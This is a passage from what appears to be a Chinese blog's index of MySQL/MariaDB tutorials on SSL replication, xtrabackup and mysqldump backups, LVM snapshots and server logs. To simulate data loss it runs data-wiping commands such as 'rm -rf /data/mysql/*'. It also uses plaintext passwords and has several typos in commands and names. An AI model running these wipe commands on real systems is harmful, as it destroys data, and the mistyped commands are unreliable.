02 &gt; slave.crt#确认证书是否成功]# openssl verify -CAfile cacert.pem master.crt slave.crtcacert.pem: OKmaster.crt: OKslave.crt: OK#将证书和key分别复制到相应的主机。]# scp -r cacert.pem master.crt master.key 192.168.1.8:/etc/my.cnf.d/]# scp -r cacert.pem slave.crt slave.key 192.168.1.18:/etc/my.cnf.d/ 主服务器配置12345678910]# vim /etc/my.cnf[mysqld]log_binserver_id=1sslssl-ca=/etc/my.cnf.d/ssl/cacert.pemssl-cert=/etc/my.cnf.d/ssl/master.crtssl-key=/etc/my.cnf.d/ssl/master.key]# systemctl restart mariadbgrant replication slave on *.* to repluse@&apos;192.168.1.%&apos; identified by &apos;centos&apos; require ssl; 从服务器配置1234567891011121314]# mysql -urepluser -preplpass -h192.168.1.8 --ssl-ca=/etc/my.cnf.d/ssl/cacert.pem --ssl-cert=/etc/my.cnf.d/ssl/slave.crt --ssl-key=/etc/my.cnf.d/ssl/slave.keySTOP SLAVE;reset slave all;CHANGE MASTER TO MASTER_HOST=&apos;192.168.1.8&apos;, MASTER_USER=&apos;repluser&apos;, MASTER_PASSWORD=&apos;centos&apos;, MASTER_PORT=3306, MASTER_LOG_FILE=&apos;master-bin.000001&apos;, MASTER_LOG_POS=245, MASTER_SSL=1, MASTER_SSL_CA = &apos;/etc/my.cnf.d/ssl/cacert.pem&apos;, MASTER_SSL_CERT = &apos;/etc/my.cnf.d/ssl/slave.crt&apos;, MASTER_SSL_KEY = &apos;/etc/my.cnf.d/ssl/slave.key&apos;;start slave； 指令集合12345678910111213141516-- 启动主从复制START SLAVE; STOP SLAVE; #停止复制SHOW SLAVE STATUS; #查看复制状态Seconds_Behind_Master: 0 #从服务器是否落后于主服务RESET SLAVE ALL; #重置从服务器的配置MASTER_SSL=1, #配合 CHANGE MASTER TO 使用，开启ssl加密复制MASTER_SSL_CA = &apos;/etc/my.cnf.d/ssl/cacert.pem&apos;,MASTER_SSL_CERT = &apos;/etc/my.cnf.d/ssl/slave.crt&apos;,MASTER_SSL_KEY = &apos;/etc/my.cnf.d/ssl/slave.key&apos;;PURGE &#123; BINARY | MASTER &#125; LOGS &#123; TO &apos;log_name&apos; | BEFORE datetime_expr &#125; #删除二进制日志，谨慎操作SHOW MASTER STATUS #查看二进制日志状态SHOW BINLOG EVENTS #查看二进制日志SHOW BINARY LOGS #查看二进制日志SHOW PROCESSLIST #查看进程，一般配合kill进程使用，KILL id #杀掉进程]]></content>
      <categories>
        <category>MYSQL</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MYSQL7]]></title>
    <url>%2Fmysql7.html</url>
    <content type="text"><![CDATA[摘要：mysql数据库的备份应用软件，xtrabackup的下载，安装，简要用法说明，小实验。 xtrabackupmariadb的版本：5.5.56-MariaDB 下载最新的percondn-xtrabackup,官网最新资源，centos7下载如下 1]# wget https://www.percona.com/downloads/XtraBackup/Percona-XtraBackup-2.4.11/binary/redhat/7/x86_64/percona-xtrabackup-24-2.4.11-1.el7.x86_64.rpm 下载完毕后，安装xtrabackup,需要启用epel源，进行依赖安装 1]# yum install -y percona-xtrabackup-24.x86_64 0:2.4.11-1.el7 相关说明备份原理及备份的文件代表意思 ​ 使用innobakupex备份时，其会调用xtrabackup备份所有的InnoDB表，复制所有关于表结构定义的相关文件(.frm)、以及MyISAM、MERGE、CSV和ARCHIVE表的相关文件，同时还会备份触发器和数据库配置信息相关的文件。这些文件会被保存至一个以时间命名的目录中,在备份时，innobackupex还会在备份目录中创建如下文件： xtrabackup_checkpoints：备份类型（如完全或增量）、备份状态（如是否已经为prepared状态）和LSN(日志序列号)范围信息,每个InnoDB页(通常为16k大小)都会包含一个日志序列号，即LSN。LSN是整个数据库系统的系统版本号，每个页面相关的LSN能够表明此页面最近是如何发生改变的xtrabackup_binlog_info：MySQL服务器当前正在使用的二进制日志文件及至备份这一刻为止二进制日志事件的位置xtrabackup_info：innobackupex工具执行时的相关信息backup-my.cnf：备份命令用到的配置选项信息xtrabackup_logfile：备份生成的日志文件 用法说明详细请参考官方说明。 备份备份时：innobackupex [option] BACKUP-ROOT-DIR option： --user：该选项表示备份账号--password：该选项表示备份的密码--host：该选项表示备份数据库的地址--databases：该选项接受的参数为数据名，如果要指定多个数据库，彼此间需要以空格隔开；--defaults-file：该选项指定从哪个文件读取MySQL配置，必须放在命令行第一个选项位置--incremental：该选项表示创建一个增量备份，需要指定--incremental-basedir--incremental-basedir：该选项指定为前一次全备份或增量备份的目录，与--incremental同用--incremental-dir：该选项表示还原时增量备份的目录--include=name：指定表名，格式：databasename.tablenam 还原前准备prepare还原:innobackupex --apply-log [option] BACKUP-DIR option: --apply-log：一般情况下,在备份完成后，数据尚且不能用于恢复操作，因为备份的数据中可能会包含尚未提交的事务或已经提交但尚未同步至数据文件中的事务。因此，此时数据文件仍处理不一致状态.此选项作用是通过回滚未提交的事务及同步已经提交的事务至数据文件使数据文件处于一致性状态;--use-memory：该选项表示和–apply-log选项一起使用，prepare 备份的时候，xtrabackup做crash recovery分配的内存大小，单位字节。也可(1MB,1M,1G,1GB)，推荐1G；--export：表示开启可导出单独的表之后再导入其他Mysql中；--redo-only：此选项在prepare base full backup，往其中merge增量备份时候使用. 还原还原： innobackupex --copy-back [选项] BACKUP-DIR innobackupex --move-back [选项][--defaults-group=GROUP-NAME]BACKUP-DIR 选项说明： –copy-back：做数据恢复时将备份数据文件拷贝到MySQL服务器的datadir;–move-back：这个选项与–copy-back相似，唯一的区别是它不拷贝文件，而是移动文件到目的地。这个选项移除backup文件，用时候必须小心。使用场景：没有足够的磁盘空间同事保留数据文件和Backup副本. 实验前提：最好启用二进制日志，并于数据文件分开存放。实验的配置文件如下：/etc/my.cnf 1234567891011121314151617181920[mysqld]datadir=/data/mysqllog_bin=/data/binlog/mysql-binsocket=/var/lib/mysql/mysql.sock# Disabling symbolic-links is recommended to prevent assorted security riskssymbolic-links=0# Settings user and group are ignored when systemd is used.# If you need to run mysqld under a different user or group,# customize your systemd unit file for mariadb according to the# instructions in http://fedoraproject.org/wiki/Systemd[mysqld_safe]log-error=/var/log/mariadb/mariadb.logpid-file=/var/run/mariadb/mariadb.pid## include all files from the config directory#!includedir /etc/my.cnf.d 全备份​ 在全备份的基础上，每天做增量备份，最后一次的未提交的事务是不能备份，只能rollback。 123#开始的全备份，并新建增量备份文件夹]# innobackupex /backups]# mkdir /backups/inc&#123;1,2&#125; -pv 模拟插入数据12345678-- 模拟第一天的插入数据，然后进行第一次增量备份insert into students values(&apos;30&apos;,&apos;hong&apos;,26,&apos;M&apos;,1,2);insert into students values(&apos;27&apos;,&apos;feng&apos;,28,&apos;M&apos;,3,2);-- 模拟第二天的插入数据及开启事务，然后进行第二次增量备份insert into students values(&apos;28&apos;,&apos;li&apos;,18,&apos;M&apos;,1,2);-- 开启事务,未commit，会导致这个事务备份不了。start transaction;update students set name=&apos;dongfei&apos; where stuid=25; 增量备份12345# 第一次增量备份]# innobackupex --incremental /backups/inc1/ --incremental-basedir=/backups/2018-06-14_12-51-10# 第二次增加备份]# innobackupex --incremental /backups/inc2 --incremental-basedir=/backups/inc1/2018-06-14_12-53-25/]# scp -a /backup/* 192.168.1.10:/backups/ 目标主机恢复数据1234567891011121314151617181920212223#模拟数据损坏]# systemctl stop mariadb]# rm -rf /data/mysql/*#整理innobackupex的备份文件]# innobackupex --apply-log --redo-only /backups/2018-06-14_12-51-10/]# innobackupex --apply-log --redo-only /backups/2018-06-14_12-51-10/ --incremental-dir=/backups/inc1/2018-06-14_12-53-25/]# innobackupex --apply-log --redo-only /backups/2018-06-14_12-51-10/ --incremental-dir=/backups/inc2/2018-06-14_12-57-41/]# ls /var/lib/mysql/]# innobackupex --copy-back /backups/2018-06-14_12-51-10/]# chown -R mysql.mysql /data/mysql/]# systemctl start mariadb]# mysql hellodb -e 'select * from students'+-------+---------------+-----+--------+---------+-----------+| StuID | Name | Age | Gender | ClassID | TeacherID |+-------+---------------+-----+--------+---------+-----------+···#未commit的数据会回滚，并不会更新。| 25 | Sun Dasheng | 100 | M | NULL | NULL | | 26 | dongfei | 25 | M | 2 | 3 || 27 | feng | 28 | M | 3 | 2 || 28 | li | 18 | M | 1 | 2 || 30 | hong | 26 | M | 1 | 2 |+-------+---------------+-----+--------+---------+-----------+ 单表操作生产中，数据量很大，实现全备份的时间，可能会很长，对于某些重要的大型表，我们可以实现xtrabackup的单表导入导出。 单表备份对比较重要的大型表，比如students表进行备份，包含数据及表结构1234]# innobackupex --include="hellodb.students" /backup/]# ls /backup/2018-06-13_15-57-49/hellodb/ -l]# mysql -e 'show create table hellodb.students']# mysql -e 'show create table hellodb.students' &gt; students.sql 模拟表损坏及丢失12]# mysql -e &apos;drop table hellodb.students&apos;]# ll /data/mysqldb/hellodb/ -l 备份还原 整理备份文件，修改表结构 1234567]# innobackupex --apply-log --export /backup/2018-06-13_15-57-49/]# ls /backup/2018-06-13_15-57-49/hellodb/ -l]# mysql hellodb -e 'select * from students']# vim students.sql #修改表结构如下CREATE TABLE `students` (\n `StuID` int(10) unsigned NOT NULL AUTO_INCREMENT,\n `Name` varchar(50) NOT NULL,\n `Age` tinyint(3) unsigned NOT NULL,\n `Gender` enum('F','M') NOT NULL,\n `ClassID` tinyint(3) unsigned DEFAULT NULL,\n `TeacherID` int(10) unsigned DEFAULT NULL,\n PRIMARY KEY (`StuID`)\n) ENGINE=InnoDB AUTO_INCREMENT=31 DEFAULT CHARSET=utf8]# mysql hellodb &lt; students.sql ]# ls /data/mysqldb/hellodb/ -l 删除表空间,将备份好的数据复制到数据库中 1234]# mysql -e 'alter table hellodb.students discard tablespace']# ls /data/mysqldb/hellodb/ -l]# cd /backup/2018-06-13_15-57-49/hellodb/]# cp /backup/2018-06-13_15-57-49/hellodb/students.&#123;cfg,exp,ibd&#125; /data/mysqldb/hellodb/ 将备份好的数据改变所有者，所属组，导入新的表空间，还原成功。 1234]# chown mysql.mysql /data/mysqldb/hellodb/*]# ll /data/mysqldb/hellodb/*]# mysql hellodb -e 'alter table students import tablespace']# mysql hellodb -e 'select * from students' 总结： 增量备份是基于全备份的基础上进行备份的，备份和还原的时候注意路径的区别; xtrabackup备份的数据所有者和所属组需要改为mysql； 备份一定要开启二进制日志文件，才能完备的进行还原。]]></content>
      <categories>
        <category>MYSQL</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MYSQL6]]></title>
    <url>%2Fmysql6.html</url>
    <content type="text"><![CDATA[摘要：MYSQL的lvm快照备份实现过程，mysqldump备份的过程. LVM快照备份特点：近乎热备的备份 实现LVM12345678910111213141516]# echo &apos;- - -&apos; &gt; /sys/class/scsi_host/host2/scan]# lsblk]# pvcreate /dev/sdb]# vgcreate vg0 /dev/sdb]# lvcreate -n lv_mysql -l 50%FREE vg0]# lvcreate -n lv_binlog -l 50%FREE vg0]# mkfs.ext4 /dev/vg0/lv_mysql]# mkfs.ext4 /dev/vg0/lv_binlog]# mkdir /data/&#123;mysql,binlog&#125;]# mount /dev/vg0/lv_mysql /data/mysql]# mount /dev/vg0/lv_binlog /data/binlog]# chown -R mysql.mysql /data/]# vim /etc/my.cnfdatadir=/data/mysqllog_bin=/data/binlog/mysql-bin]# systemctl restart mariadb 快照备份123456789101112131415161718192021-- 读锁表flush tables with read lock;-- 刷新日志flush logs;-- 记录bin-log的positionshow master logs;+------------------+-----------+| Log_name | File_size |+------------------+-----------+| mysql-bin.000001 | 17750 || mysql-bin.000002 | 385 |+------------------+-----------+-- 创建lvm快照lvcreate -n lv_mysql_snap -L 10G -s -p r /dev/vg0/lv_mysql-- 解锁unlock tables;-- 将快照的数据备份出来,centos6不用加-o选项]# mount -o nouuid,norecovery /dev/vg0/lv_mysql_snap /mnt]# cp -a /mnt/ /backup]# umount /mnt]# lvremove /dev/vg0/lv_mysql_snap 模拟场景12345-- 数据已经变更create database testdb;use hellodb;update students set name=&apos;houzi&apos; where stuid=25;drop table teachers; 备份恢复至最新状态123456789101112131415]# rm -rf /data/mysql/*-- 禁止用户访问]# systemctl stop mariadb]# cp -av /backup/* /data/mysql]# vim /etc/my.cnf[mysqld]skip_network]# systemctl start mariadb]# mysqlflush tables with read lock;show master logs;-- 导入最新的二进制日志，恢复至破坏后的节点]# mysqlbinlong --start-position=385 mysql-bin.000004 &gt;/backup/bin.sql]# mysqlbinlong --start-position=385 mysql-bin.000005 &gt;&gt;/backup/bin.sql]# mysql &lt; /backup/bin.log mysqldump备份mysqldump参考：官方说明 mysqldump常见选项1234567891011121314151617-A， --all-databases 备份所有数据库，含create database-B , --databases db_name… 指定备份的数据库，包括create database语句-E, --events：备份相关的所有event scheduler-R, --routines：备份所有存储过程和存储函数--triggers：备份表相关触发器，默认启用,用--skip-triggers，不备份触发器--master-data[=#]： 此选项须启用二进制日志 1：所备份的数据之前加一条记录为CHANGE MASTER TO语句，非注释，不指定#，默认为1 2：记录为注释的CHANGE MASTER TO语句此选项会自动关闭--lock-tables功能，自动打开--lock-all- tables功能（除非开启--single-transaction）-F, --flush-logs ：备份前滚动日志，锁定表完成后，执行flush logs命令,生成新的二进制日志文件，配合-A时，会导致刷新多次数据库，在同一时刻执行转储和日志刷新，则应同时使用--flush-logs和-x，--master-data或-single-transaction,此时只刷新一次，建议：和-x，--master-data或 --single-transaction一起使用--compact 去掉注释，适合调试，生产不使用-d, --no-data 只备份表结构-t, --no-create-info 只备份数据,不备份create table-n,--no-create-db 不备份create database，可被-A或-B覆盖--flush-privileges 备份mysql或相关时需要使用-f, --force 忽略SQL错误，继续执行--hex-blob 使用十六进制符号转储二进制列（例如，“abc”变为0x616263），受影响的数据类型包括BINARY， VARBINARY，BLOB，BIT-q, --quick 不缓存查询，直接输出，加快备份速度 实验选项演示:比较常用的是mysqldump -A,mysqldump -A -F,mysqldump -B database 1234567]# mysqldump -uroot -pcentos -B hellodb &gt; /backup/hellodb_B.sql]# mysqldump -uroot -pcentos -A |gzip &gt; /backup/all.sql.gz]# rm -rf /var/lib/mysql/*]# gzip -d /backip/all.sql.gz #gunzip /backip/all.sql.gz ]# mysql &lt; /backup/all.sql]# mysqldump -A -F &gt; /backup/all_f.log # 滚动刷新日志]# mysql -e &apos;show binary logs&apos; InnoDB备份选项： 支持热备，可用温备但不建议用--single-transaction 此选项Innodb中推荐使用，不适用MyISAM，此选项会开始备份前，先执行START TRANSACTION指令开启事务; 此选项通过在单个事务中转储所有表来创建一致的快照。 仅适用于存储在支持多版本控制的存储引擎中的表（目前只有InnoDB可以）; 转储不保证与其他存储引擎保持一致。 在进行单事务转储时，要确保有效的转储文件（正确的表内容和二进制日志位置），没有其他连接应该使用以下语句：ALTER TABLE，DROP TABLE，RENAME TABLE，TRUNCATE TABLE; 此选项和--lock-tables（此选项隐含提交挂起的事务）选项是相互排斥; 备份大型表时，建议将--single-transaction选项和--quick结合一起使用; MyISAM备份选项： 支持温备；不支持热备，所以必须先锁定要备份的库，而后启动备份操作锁定方法如下： -x,--lock-all-tables:,加全局读锁，锁定所有库的所有表，同时加--single-transaction或--lock-tables选项会关闭此选项功能注意：数据量大时，可能会导致长时间无法并发访问数据库 -l,--lock-tables：对于需要备份的每个数据库，在启动备份之前分别锁定其所有表，默认为on,--skip-lock-tables选项可禁用,对备份MyISAM的多个库,可能会造成数据不一致 注：以上选项对InnoDB表一样生效，实现温备，但不推荐使用 实验实验1实现不同数据库的备份，但是和mysqldump -A不同，将每个数据库分别打包方法1：利用sed,生成一个备份脚本12345]# mysql -e &apos;show databases&apos; | grep -iEv &apos;database|schema&apos; | sed -r &apos;s/(.*)/mysqldump -uroot -B \1 |gzip &gt;\1-`date +%F`.sql.gz/&apos; &gt;backup.sh]# cat backup.shmysqldump -uroot -B hellodb |gzip &gt;hellodb-`date +%F`.sql.gzmysqldump -uroot -B mysql |gzip &gt;mysql-`date +%F`.sql.gzmysqldump -uroot -B test |gzip &gt;test-`date +%F`.sql.gz 方法2：利用for循环， 1234#!/bin/bashfor db in `mysql -e 'show databases' | grep -iEv 'database|schema'` ;do mysqldump -uroot -B $db &gt; $&#123;db&#125;-`date +%F`.sql.gzdone 总结： 复习了脚本的用法及sed，grep,gzip，for循坏，又能够实现备份不同数据库的分类存档 实验2场景：数据库文件损坏，如何恢复。前提：有备份文件,启用了二进制日志； 1234567]# mysql &lt; hellodb.sql]# mysqldump -A -F --single-transaction --master-data=1 &gt;/backup/full.sql]# less |/backup/full.sql···#记录的节点位置CHANGE MASTER TO MASTER_LOG_FILE=&apos;mysql-bin.000004&apos;, MASTER_LOG_POS=245;··· 模拟数据改变 12345-- 数据发生了变化create database testdb;use hellodb;update students set name=&apos;houzi&apos; where stuid=25;drop table teachers; 删库恢复 12345678910]# vim /etc/my.cnf[mysqld]skip_network]# rm -rf /data/mysql/* #数据被破坏]# mysql -e &apos;use hellodb&apos;ERROR 1049 (42000): Unknown database &apos;hellodb&apos;]# systemctl restart mariadb]# mysqlbinlog --start-position=245 mysql-bin.000004 &gt;/backup/bin.sql]# mysql &lt; /backup/full.sql]# mysql &lt; /backup/bin.sql 实验3场景：9点有全备份，10点的时候误删除表，10:10后续用户修改过另外一张表，如何还原把删除表的操作还原；条件：log-bin必须启用，有数据备份。 场景模拟 12345678]# mysqldump -A -F --single-transaction --master-data=1 &gt;/backup/full.sql-- 修改表use hellodbinsert students values(26,&apos;dongfei&apos;,25,&apos;M&apos;,2,3)-- 误删除drop table students; -- 用户继续修改insert courses values(8,&apos;magedu&apos;); 定点到删除的位置 1234567891011flush tables with read lock;flush logs;-- 查看当前的bin-log的positionshow master logs;#查询全备份的position，确定全备份到目前之间的所有日志文件及position]# head /backup/full.sqlCHANGE MASTER TO MASTER_LOG_FILE=&apos;mysql-bin.000009&apos;, MASTER_LOG_POS=245;#找到删除语句的，删除此语句]# mysqlbinlog --start-position=245 mysql-bin.000009 &gt;/backup/bin.sql]# vim /backup/bin.sql将drop table students; 这个语句的执行at段删掉即可 还原1234567891011121314151617]# systemctl stop mariadb]# rm -rf /data/mysql/*]# systemctl start mariadb]# mysql &lt; /backup/full.sql]# mysql &lt; /backup/bin.sql]# mysql -e &apos;show tables&apos; +-------------------+| Tables_in_hellodb |+-------------------+| classes || coc || courses | | scores || students | #恢复删错的表，且最新数据保存下来了| teachers || toc |+-------------------+ 生产环境备份实战策略innodb:建议的策略 1234#!/bin/bashBACKUP=&quot;/backup&quot;BACKUP_TIME=`date +%F_%T`mysqldump -uroot -ppassword -A -F -E -R --single-transaction --master-data=1 --flush-privileges &gt; $BACKUP/fullbak_$BACKUP_TIME.sql MyISAM:建议备份策略 1234#!/bin/bashBACKUP=&quot;/backup&quot;BACKUP_TIME=`date +%F_%T`mysqldump -uroot -ppassword -A -F -E -R -x --master-data=1 --flush-privileges &gt;$&#123;BACKUP&#125; /fullbak_$&#123;BACKUP_TIME&#125;.sql]]></content>
      <categories>
        <category>MYSQL</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MYSQL(五)]]></title>
    <url>%2Fhexo-mysql5.html</url>
    <content type="text"><![CDATA[摘要：MYSQL的日志，事务日志，错误日志，通用日志，慢查询日志，二进制日志的学习过程,其中的相关变量均可以参考官网配置 日志日志分类： 事务日志： transaction log 中继日志： reley log 错误日志： error log 通用日志： general log 慢查询日志： slow query log 二进制日志： binary log 命令日志：]#cat .mysql.history,当前终端的命令日志不会保存，退出后自动保存至改文件 事务日志 事务日志：transaction log 事务型存储引擎自行管理和使用，建议和数据文件分开存放 redo log 已经做的事务日志undo log 未做的事务日志 Innodb事务日志相关配置：innodb_log_file_size是一个global,但不是dynamic的变量，要想生效，必须写入配置文件中。 1234show variables like &apos;%innodb_log%&apos;;innodb_log_file_size 5242880 -- 每个日志文件大小,/var/lib/mysql/ib_logfileinnodb_log_files_in_group 2 -- 日志组成员个数，建议调大innodb_log_group_home_dir ./ -- 事务文件路径 调大日志文件,事务日志文件路径,（建议单独存放）1234567]# mkdir -pv /data/mysqllogs/]# chmod mysql.mysql /data/mysqllogs/ ]# vim /etc/my.cnf[mysqld]innodb_log_files_in_group=5 #仅修改日志数会导致服务起不来innodb_log_group_home_dir=/data/mysqllogs/]# systemctl restart mariadb 中继日志：relay log 主从复制架构中，从服务器用于保存从主服务器的二进制日志中读取到的事件 错误日志错误日志： mysqld启动和关闭过程中输出的事件信息 mysqld运行中产生的错误信息 event scheduler运行一个event时产生的日志信息 在主从复制架构中的从服务器上启动从服务器线程时产生的信息 错误日志相关配置：SHOW GLOBAL VARIABLES LIKE &#39;log_error&#39;； 错误文件路径，配置文件位置：/etc/my.cnf log_error=/PATH/TO/LOG_ERROR_FILE 是否记录警告信息至错误日志文件 log_warnings=1|0 默认值1 通用日志通用日志：记录对数据库的通用操作，包括错误的SQL语句 文件：file，默认值 表：table general_log: OFF，默认值，全局变量，global，，dynamic log_output: FILE，默认值 通用日志相关设置: 123456789101112131415show variables like &apos;general_log%&apos;;+------------------+---------------+| Variable_name | Value |+------------------+---------------+| general_log | OFF || general_log_file | localhost.log |+------------------+---------------+set global general_log=on;show variables like &apos;log_output&apos;;+---------------+-------+| Variable_name | Value |+---------------+-------+| log_output | FILE | -- TABLE|FILE|NONE+---------------+-------+set global log_output=table; 实验目标：生成大文件的事务日志文件，了解事务日志的原理，及相应的特殊性 准备工作每个表单独使用一个表空间存储表的数据和索引,在配置文件/etc/my.cnf中，加入innodb_file_per_table=ON，便于日志的观察 123]# vim /etc/my.cnf[mysqld]innodb_file_per_table=ON 生成大文件脚本123456789101112131415use testdb-- 脚本内容create table testlog (id int auto_increment primary key,name char(10),age int default 20);delimiter $$create procedure pro_testlog()begindeclare i int;set i = 1;while i &lt; 100000do insert into testlog(name,age) values(concat(&apos;wang&apos;,i),i) ;set i = i +1;end while;end$$delimiter ; 使用相关脚本实验123456789101112131415start transaction;-- 生成大数据事务call pro_testlog; call pro_testlog; call pro_testlog; -- 查询数据select count(*) from testlog; \! ls -lh /var/lib/mysql/testdb/testlog.ibd-- 数据直接写入数据文件，超过了事务日志的大小。truncate testlog;-- 删除数据库delete from testlog;-- 用delete删除大文件，查询数据文件没有减少,需要optimize进行清除。\! ls /var/lib/mysql/testdb/testlog.ibd -h optimize table testlog; 实验总结：超过了事务日志的大小的数据文件，事务的操作直接写入数据文件，该操作由于事务日志文件太小导致，建议加大，增加安全；删除大文件的是，有两种方法`truncate testlog;`或者`delete from testlog;`和`optimize table testlog;`进行删除。 慢查询日志slow_query_log，是一个global,sesion,dynamic的变量，支持动态修改 12345678910111213show variables like &apos;slow%&apos;;+---------------------+--------------------+| Variable_name | Value |+---------------------+--------------------+| slow_launch_time | 2 || slow_query_log | OFF || slow_query_log_file | localhost-slow.log |+---------------------+--------------------+set global slow_query_log=ON;-- ll /var/lib/mysql/hellodb/select sleep(1),name from students;-- 查询谁在占用show processlist; 和慢查询相关的设置 1234567use hellodb-- 查询时间不少于10s，或者不使用索引，系统自动默认OFF-- log_queries_not_using_indexes=OFFselect * from students;-- 系统自动优化sql语句，可能使用索引或不使用explain select * from students where name like &apos;x%&apos;\G;explain select * from students where name like &apos;s%&apos;\G; profiling:global,sesion,dynamic,全局，会话，可动态修改的变量，可以根据show profiles，来慢查询一些相对耗时的sql语句,进行优化 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748set profiling=ON;show variables like &apos;prof%&apos;;+------------------------+-------+| Variable_name | Value |+------------------------+-------+| profiling | ON || profiling_history_size | 15 |+------------------------+-------+show profiles;+----------+------------+------------------------+| Query_ID | Duration | Query |+----------+------------+------------------------+| 1 | 0.00041210 | select @@profiling || 2 | 0.09205547 | select * from students |+----------+------------+------------------------+show profile for query 2;+--------------------------------+----------+| Status | Duration |+--------------------------------+----------+| starting | 0.000016 || Waiting for query cache lock | 0.000003 || init | 0.000002 || checking query cache for query | 0.000144 || checking permissions | 0.000010 || Opening tables | 0.090296 || After opening tables | 0.000014 || System lock | 0.000045 || Table lock | 0.000013 || Waiting for query cache lock | 0.000168 || init | 0.000176 || optimizing | 0.000012 || statistics | 0.000016 || preparing | 0.000019 || executing | 0.000003 || Sending data | 0.000599 || end | 0.000010 || query end | 0.000007 || closing tables | 0.000004 || Unlocking tables | 0.000015 || freeing items | 0.000007 || updating status | 0.000005 || Waiting for query cache lock | 0.000003 || updating status | 0.000419 || Waiting for query cache lock | 0.000008 || updating status | 0.000003 || storing result in query cache | 0.000008 || cleaning up | 0.000034 |+--------------------------------+----------+ 二进制日志记录所有的增删改 记录导致数据改变或潜在导致数据改变的SQL语句 记录已提交的日志 不依赖于存储引擎类型 功能：通过“重放”日志文件中的事件来生成数据副本 注意：建议二进制日志和数据文件分开存放 二进制日志记录格式二进制日志记录三种格式 基于“语句”记录：statement，记录语句，默认模式 基于“行”记录：row，记录数据，日志量较大，建议使用这个模式 混合模式：mixed, 让系统自行判定该基于哪种方式进行 格式查看：show variables like &#39;%binlog_format%&#39;; 二进制日志文件的构成 日志文件：mysql|mariadb-bin.文件名后缀，二进制格式 索引文件：mysql|mariadb-bin.index，文本格式 二进制日志相关的服务器变量：mariadb-10.2.15: sql_log_bin：global,dynamic，可以动态开启关闭 12345678910sql_log_bin=ON|OFF：-- 是否记录二进制日志，默认ONlog_bin=/PATH/BIN_LOG_FILE：-- 指定文件位置；默认ON，表示不启用二进制日志功能，上述两项都为ON才可max_binlog_size=1073741824：-- 单个二进制日志文件的最大体积，到达最大值会自动滚动，默认为1Gsync_binlog=1|0：-- 设定是否启动二进制日志即时同步磁盘功能，默认0，由操作系统负责同步日志到磁盘expire_logs_days=N：-- 二进制日志可以自动删除的天数。 默认为0，即不自动删除 二进制日志相关配置配置相关: 123456789show master logs;show binary logs;-- 查询二进制的日志文件show master status;update students set name=&apos;xyz&apos; where stuid=10;show binlog events in &apos;mysql-bin.000003&apos; from 1577;-- 重新生成二进制日志文件flush logs;show master status; 日志mysqlbinlog：二进制日志的客户端命令工具 命令格式： 12345mysqlbinlog [OPTIONS] log_file…--start-position=# 指定开始位置--stop-position=#--start-datetime= --stop-datetime= 时间格式：YYYY-MM-DD hh:mm:ss，--base64-output[=name] 查询mysqlbinlog --help 来帮助自己更好理解此命令 示例： 12]# mysqlbinlog --start-position=6787 --stop-position=7527 /var/lib/mysql/mariadb-bin.000003]# mysqlbinlog --start-datetime=&quot;2018-01-30 20:30:10&quot; --stop-datetime=&quot;2018-01-30 20:35:22&quot; mariadb-bin.000003; 二进制日志格式mysqlbinlog查询的日志格式如下： 1234567891011121314151617BEGIN/*!*/;# at 1619#180611 14:24:50 server id 1 end_log_pos 1734 CRC32 0x7c5b65fe Query thread_id=15 exec_time=0 error_code=0SET TIMESTAMP=1528698290/*!*/;update students set name=&apos;xyz&apos; where stuid=10/*!*/;# at 1734事件发生的日期和时间：180611 14:24:50 事件发生的服务器标识：server id 1事件的结束位置：end_log_pos 1734事件的类型：Query事件发生时所在服务器执行此事件的线程的ID：thread_id=1语句的时间戳与将其写入二进制文件中的时间差：exec_time=0错误代码：error_code=0执行的操作：update students set name=&apos;xyz&apos; where stuid=10 清除指定二进制日志PURGE: 清除指定二进制日志： 12PURGE &#123; BINARY | MASTER &#125; LOGS&#123; TO &apos;log_name&apos; | BEFORE datetime_expr &#125; 示例： 12PURGE BINARY LOGS BEFORE &apos;2018-01-23&apos;;PURGE BINARY LOGS BEFORE &apos;2018-05-22 09:25:30&apos;; 删除所有二进制日志，index文件重新记数 RESET MASTER [TO #]; 日志文件从#开始记数，默认从1开始，一般是master第一次启动时执行，MariaDB10.1.6开始支持TO # 切换日志文件：FLUSH LOGS，后续备份的mysqldump -F,就是切换日志文件进行备份 123456789101112-- 清楚000002之前的二进制文件，pruge binary logs to &quot;mysql-bin.000002&quot;;show master logs;+------------------+-----------+| Log_name | File_size |+------------------+-----------+| mysql-bin.000002 | 10042 || mysql-bin.000003 | 1812 || mysql-bin.000004 | 385 |+------------------+-----------+-- 删除至000001的二进制文件reset master to 1 备份和恢复为什么要备份 灾难恢复：硬件故障、软件故障、自然灾害、黑客攻击、误操作测试等数据 丢失场景 备份注意要点能容忍最多丢失多少数据恢复数据需要在多长时间内完成需要恢复哪些数据还原要点做还原测试，用于测试备份的可用性还原演练 备份类型：完全备份，部分备份 完全备份：整个数据集 部分备份：只备份数据子集，如部分库或表 完全备份、增量备份、差异备份 增量备份：仅备份最近一次完全备份或增量备份（如果存在增量）以来变化的数据，备份较快，还原复杂 差异备份：仅备份最近一次完全备份以来变化的数据，备份较慢，还原简单 注意：二进制日志文件不应该与数据文件放在同一磁盘 冷、温、热备份 冷备：读写操作均不可进行 温备：读操作可执行；但写操作不可执行 热备：读写操作均可执行 MyISAM：温备，不支持热备InnoDB: 都支持 物理和逻辑备份 物理备份：直接复制数据文件进行备份，与存储引擎有关，占用较多的空间，速度快 逻辑备份：从数据库中“导出”数据另存而进行的备份，与存储引擎无关，占用空间少，速度慢，可能丢失精度 备份时需要考虑的因素 温备的持锁多久备份产生的负载备份过程的时长恢复过程的时长 备份什么 数据二进制日志、InnoDB的事务日志程序代码（存储过程、存储函数、触发器、事件调度器）服务器的配置文件 冷备份:服务器可以停机的情况下,备份加还原 12345678]# systemctl stop mariadb]# ll /var/lib/mysql/]# tar -Jcvf /data/all.tar.xz /var/lib/mysql/]# rm -fr /var/lib/mysql/]# tar -xf /data/all.tar.xz /var/lib/mysql/]# mv /var/lib/mysql/var/lib/mysql/* /var/lib/mysql/]# rm -rf /var/lib/mysql/var]# systemctl start mariadb 未完待续]]></content>
      <categories>
        <category>MYSQL</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MYSQL(四)]]></title>
